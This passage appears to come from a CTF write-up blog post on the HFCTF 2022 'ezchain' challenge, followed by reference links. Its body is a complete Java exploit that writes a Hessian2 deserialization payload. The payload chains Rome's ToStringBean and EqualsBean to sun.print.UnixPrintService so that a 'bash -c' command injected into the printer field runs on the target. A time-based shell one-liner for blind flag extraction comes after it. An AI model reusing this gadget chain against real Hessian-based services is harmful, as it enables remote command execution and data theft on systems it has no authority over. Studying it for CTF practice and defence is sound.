+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Main</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">main</span><span style="color:#666">(</span>String<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> Exception<span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#666">.</span><span style="color:#b44">out</span><span style="color:#666">.</span><span style="color:#b44">println</span><span style="color:#666">(</span><span style="color:#b44">&#34;HFCTF2022&#34;</span><span style="color:#666">.</span><span style="color:#b44">hashCode</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#666">=</span> <span style="color:#b44">&#34;:Y1\&#34;nOJF-6A&#39;&gt;|r-&#34;</span><span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#666">.</span><span style="color:#b44">out</span><span style="color:#666">.</span><span style="color:#b44">println</span><span style="color:#666">(</span>s<span style="color:#666">.</span><span style="color:#b44">hashCode</span><span style="color:#666">());</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String cmd <span style="color:#666">=</span> args<span style="color:#666">[</span>0<span style="color:#666">];</span>
+</span></span><span style="display:flex;"><span>        String path <span style="color:#666">=</span> args<span style="color:#666">[</span>1<span style="color:#666">];</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        FileOutputStream outputStream <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> FileOutputStream<span style="color:#666">(</span>path<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Hessian2Output out <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Hessian2Output<span style="color:#666">(</span>outputStream<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        SerializerFactory sf <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> NoWriteReplaceSerializerFactory<span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        sf<span style="color:#666">.</span><span style="color:#b44">setAllowNonSerializable</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        out<span style="color:#666">.</span><span style="color:#b44">setSerializerFactory</span><span style="color:#666">(</span>sf<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Field theUnsafe <span style="color:#666">=</span> Unsafe<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span><span style="color:#b44">&#34;theUnsafe&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        theUnsafe<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Unsafe unsafe <span style="color:#666">=</span> <span style="color:#666">(</span>Unsafe<span style="color:#666">)</span> theUnsafe<span style="color:#666">.</span><span style="color:#b44">get</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">null</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        Object unix <span style="color:#666">=</span> unsafe<span style="color:#666">.</span><span style="color:#b44">allocateInstance</span><span style="color:#666">(</span>UnixPrintService<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#666">(</span>unix<span style="color:#666">,</span> <span style="color:#b44">&#34;printer&#34;</span><span style="color:#666">,</span> String<span style="color:#666">.</span><span style="color:#b44">format</span><span style="color:#666">(</span><span style="color:#b44">&#34;;bash -c &#39;%s&#39;;&#34;</span><span style="color:#666">,</span> cmd<span style="color:#666">));</span>
+</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#666">(</span>unix<span style="color:#666">,</span> <span style="color:#b44">&#34;lpcStatusCom&#34;</span><span style="color:#666">,</span> <span style="color:#a2f;font-weight:bold">new</span> String<span style="color:#666">[]{</span><span style="color:#b44">&#34;ls&#34;</span><span style="color:#666">,</span> <span style="color:#b44">&#34;ls&#34;</span><span style="color:#666">,</span> <span style="color:#b44">&#34;ls&#34;</span><span style="color:#666">});</span>
+</span></span><span style="display:flex;"><span>        ToStringBean toStringBean <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> ToStringBean<span style="color:#666">(</span>Class<span style="color:#666">.</span><span style="color:#b44">forName</span><span style="color:#666">(</span><span style="color:#b44">&#34;sun.print.UnixPrintService&#34;</span><span style="color:#666">),</span> unix<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        EqualsBean hashCodeTrigger <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> EqualsBean<span style="color:#666">(</span>ToStringBean<span style="color:#666">.</span><span style="color:#b44">class</span><span style="color:#666">,</span> toStringBean<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        out<span style="color:#666">.</span><span style="color:#b44">writeMapBegin</span><span style="color:#666">(</span><span style="color:#b44">&#34;java.util.HashMap&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        out<span style="color:#666">.</span><span style="color:#b44">writeObject</span><span style="color:#666">(</span>hashCodeTrigger<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        out<span style="color:#666">.</span><span style="color:#b44">writeObject</span><span style="color:#666">(</span><span style="color:#b44">&#34;value&#34;</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        out<span style="color:#666">.</span><span style="color:#b44">writeMapEnd</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        out<span style="color:#666">.</span><span style="color:#b44">close</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#0b0;font-weight:bold">void</span> <span style="color:#00a000">setFieldValue</span><span style="color:#666">(</span>Object obj<span style="color:#666">,</span> String field<span style="color:#666">,</span> Object value<span style="color:#666">){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">try</span><span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            Class clazz <span style="color:#666">=</span> obj<span style="color:#666">.</span><span style="color:#b44">getClass</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>            Field fld <span style="color:#666">=</span> clazz<span style="color:#666">.</span><span style="color:#b44">getDeclaredField</span><span style="color:#666">(</span>field<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            fld<span style="color:#666">.</span><span style="color:#b44">setAccessible</span><span style="color:#666">(</span><span style="color:#a2f;font-weight:bold">true</span><span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            fld<span style="color:#666">.</span><span style="color:#b44">set</span><span style="color:#666">(</span>obj<span style="color:#666">,</span> value<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span><span style="color:#a2f;font-weight:bold">catch</span> <span style="color:#666">(</span>Exception e<span style="color:#666">){</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#666">.</span><span style="color:#b44">printStackTrace</span><span style="color:#666">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">static</span> <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">NoWriteReplaceSerializerFactory</span> <span style="color:#a2f;font-weight:bold">extends</span> SerializerFactory <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         * {@inheritDoc}
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         *
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f">@Override</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">public</span> Serializer <span style="color:#00a000">getObjectSerializer</span> <span style="color:#666">(</span>Class<span style="color:#666">&lt;?&gt;</span> cl <span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> HessianProtocolException <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#a2f;font-weight:bold">super</span><span style="color:#666">.</span><span style="color:#b44">getObjectSerializer</span><span style="color:#666">(</span>cl<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         * {@inheritDoc}
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         *
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">         */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f">@Override</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">public</span> Serializer <span style="color:#00a000">getSerializer</span> <span style="color:#666">(</span> Class cl <span style="color:#666">)</span> <span style="color:#a2f;font-weight:bold">throws</span> HessianProtocolException <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>            Serializer serializer <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">super</span><span style="color:#666">.</span><span style="color:#b44">getSerializer</span><span style="color:#666">(</span>cl<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#666">(</span> serializer <span style="color:#a2f;font-weight:bold">instanceof</span> WriteReplaceSerializer<span style="color:#666">)</span> <span style="color:#666">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">return</span> UnsafeSerializer<span style="color:#666">.</span><span style="color:#b44">create</span><span style="color:#666">(</span>cl<span style="color:#666">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> serializer<span style="color:#666">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#666">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#666">}</span>
+</span></span></code></pre></div><p>之后可以通过命令盲注或者javaagent内存马获取flag</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>if [ `cut -c {1} flag` = &#34;{a}&#34; ];then sleep 2;fi
+</span></span></code></pre></div><p>参考：</p>
+<p><a href="https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/#%E5%88%A9%E7%94%A8%E4%BA%8C%EF%BC%9AUnixPrintService%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/#%E5%88%A9%E7%94%A8%E4%BA%8C%EF%BC%9AUnixPrintService%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4</a></p>
+<p><a href="https://xz.aliyun.com/t/11061">https://xz.aliyun.com/t/11061</a></p>
+<p><a href="http://miku233.viewofthai.link/2022/05/29/%E8%99%8E%E7%AC%A6CTF/">http://miku233.viewofthai.link/2022/05/29/%E8%99%8E%E7%AC%A6CTF/</a></p>
+<p><a href="http://www.bmth666.cn/bmth_blog/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/#2022%E8%99%8E%E7%AC%A6-ezchain-Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">http://www.bmth666.cn/bmth_blog/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/#2022%E8%99%8E%E7%AC%A6-ezchain-Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p>
+<p><a href="https://tttang.com/archive/1510/#toc_0x01-ezchain-hfctf2022">https://tttang.com/archive/1510/#toc_0x01-ezchain-hfctf2022</a></p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
